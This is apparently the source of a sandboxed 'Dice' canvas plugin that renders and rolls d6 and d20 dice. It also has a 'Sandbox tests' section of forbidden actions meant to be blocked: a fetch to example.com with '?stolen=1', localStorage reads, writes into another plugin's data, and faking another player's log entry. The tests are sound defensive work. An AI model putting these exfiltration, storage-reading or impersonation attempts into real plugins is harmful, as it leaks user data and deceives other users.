// Dice: an external canvas plugin. Runs in a sandbox; it only sees its own nodes and returns plain
// data (changes, events, render trees). No imports, no DOM, no network.

const PIPS = { 1: [4], 2: [0, 8], 3: [0, 4, 8], 4: [0, 2, 6, 8], 5: [0, 2, 4, 6, 8], 6: [0, 2, 3, 5, 6, 8] };

const dieNode = (id, at, sides, z) => ({
  id,
  type: 'text',
  x: Math.round(at.x),
  y: Math.round(at.y),
  width: 96,
  height: 96,
  z,
  // what a viewer without the plugin (or Obsidian) shows
  text: `Die d${sides} (needs the Dice plugin)`,
  'x-dice': { kind: 'die', sides, value: sides, rolls: 0 },
});

const myDice = (doc, ids) => (ids || []).map((id) => doc.get(id)).filter((n) => n && n['x-dice']);

export default {
  types: {
    die: {
      actions: { roll: 'roll' },
      render(node) {
        const d = node['x-dice'];
        const face =
          d.sides === 6
            ? {
                class: 'face',
                style: { display: 'grid', 'grid-template-columns': 'repeat(3, 1fr)', gap: '4px', width: '60px', height: '60px' },
                children: Array.from({ length: 9 }, (_, i) => ({
                  style: { width: '14px', height: '14px', 'border-radius': '50%', background: PIPS[d.value]?.includes(i) ? '#222' : 'transparent', 'place-items': 'center' },
                })),
              }
            : { style: { 'font-size': '34px', 'font-weight': 700, color: '#222' }, text: d.value };
        return {
          action: 'roll',
          title: `d${d.sides}: click to roll (rolled ${d.rolls} times)`,
          style: {
            width: '100%', height: '100%', display: 'flex', 'flex-direction': 'column', 'align-items': 'center',
            'justify-content': 'center', background: d.sides === 6 ? '#f5f1e6' : '#e6eef5', 'border-radius': '16px',
            'box-shadow': '0 3px 8px rgba(0,0,0,0.4)', cursor: 'pointer',
          },
          children: [face, { tag: 'small', style: { color: '#777', 'font-size': '10px' }, text: `d${d.sides}` }],
        };
      },
    },
  },

  commands: {
    create(doc, at, ctx) {
      return { changes: [{ op: 'add', node: dieNode(ctx.newId(), { x: (at?.x ?? 0) - 48, y: (at?.y ?? 0) - 48 }, 6, doc.topZ + 1) }] };
    },
    createD20(doc, a, ctx) {
      const at = a?.at ?? { x: 0, y: 0 };
      return { changes: [{ op: 'add', node: dieNode(ctx.newId(), { x: at.x - 48, y: at.y - 48 }, 20, doc.topZ + 1) }] };
    },
    roll(doc, a, ctx) {
      const dice = myDice(doc, a?.ids);
      const changes = [];
      const rolled = [];
      for (const n of dice) {
        const d = n['x-dice'];
        const value = 1 + Math.floor(ctx.random() * d.sides);
        rolled.push(value);
        changes.push({ op: 'set', id: n.id, key: 'x-dice.value', value }, { op: 'set', id: n.id, key: 'x-dice.rolls', value: d.rolls + 1 });
      }
      if (!rolled.length) return [];
      const total = rolled.reduce((s, v) => s + v, 0);
      return {
        changes,
        events: [{ type: 'dice.roll', text: `rolled ${rolled.join(' + ')}${rolled.length > 1 ? ` = ${total}` : ''}`, targets: dice.map((n) => n.id), cue: 'pulse' }],
      };
    },

    // ---- things this plugin is NOT allowed to do (Sandbox tests menu) ----

    /** Paints every selected node red: denied as soon as the selection holds a node that isn't a die. */
    paintSelection(doc, a) {
      return { changes: (a?.ids ?? []).map((id) => ({ op: 'set', id, key: 'color', value: '1' })) };
    },
    /** Tries to turn cards face up by writing the cards plugin's namespace. */
    flipCards(_doc, a) {
      return { changes: (a?.ids ?? []).map((id) => ({ op: 'set', id, key: 'x-cards.faceUp', value: true })) };
    },
    /** Counts what it can see: only its own dice (no nodes:read:all). */
    look(doc) {
      return { events: [{ type: 'dice.look', text: `(dice plugin) can see ${doc.nodes.length} node(s) on the table` }] };
    },
    /** Tries the network: network:none = the sandbox CSP blocks it. */
    async phoneHome() {
      const r = await fetch('https://example.com/?stolen=1');
      return { events: [{ type: 'dice.net', text: `(dice plugin) reached the network: ${r.status}` }] };
    },
    /** Tries to reach the app's own storage: the sandbox has an opaque origin. */
    readStorage() {
      let what;
      try {
        what = `localStorage has ${localStorage.length} keys`;
      } catch (e) {
        what = `localStorage blocked (${e.name})`;
      }
      return { events: [{ type: 'dice.storage', text: `(dice plugin) ${what}` }] };
    },
    /** Pretends to be someone else in the log: the host strips the actor. */
    impersonate() {
      return { events: [{ type: 'dice.fake', text: 'resigned the game', actor: { id: 'x', name: 'Your opponent', color: '#f00' } }] };
    },
  },

  kits: [{ id: 'd6', label: 'Die (d6) · Dice plugin', command: 'create' }],

  menu: [
    { label: 'Roll', type: 'die', min: 1, command: 'roll' },
    { label: 'Add a d20', max: 0, command: 'createD20' },
    { group: 'Sandbox tests (Dice)', label: 'Paint selection red', min: 1, command: 'paintSelection' },
    { group: 'Sandbox tests (Dice)', label: 'Turn selected cards face up', min: 1, command: 'flipCards' },
    { group: 'Sandbox tests (Dice)', label: 'Count what I can see', command: 'look' },
    { group: 'Sandbox tests (Dice)', label: 'Phone home (network)', command: 'phoneHome' },
    { group: 'Sandbox tests (Dice)', label: 'Read app storage', command: 'readStorage' },
    { group: 'Sandbox tests (Dice)', label: 'Log as another player', command: 'impersonate' },
  ],
};
